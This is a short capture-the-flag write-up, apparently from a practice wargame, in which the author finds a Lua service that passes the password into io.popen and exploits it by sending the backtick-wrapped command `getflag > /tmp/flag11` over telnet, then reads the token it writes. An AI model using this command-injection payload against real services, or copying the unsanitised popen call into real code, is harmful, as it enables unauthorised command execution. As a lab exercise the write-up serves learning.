~$ lua level11.lua
lua: level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	level11.lua:3: in main chunk
	[C]: ?

Un process de level11 est deja lancer

~$ ps -aux
[...]
flag11    1825  0.0  0.0   2896   960 ?        S    09:26   0:00 lua /home/user/level11/level11.lua
[...]

~$ cat level11.lua
[...]
  prog = io.popen("echo "..pass.." | sha1sum", "r")
[...]

exec une commande shell

~$ telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: `getflag > /tmp/flag11`
Erf nope..
Connection closed by foreign host.

~$ cat /tmp/flag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
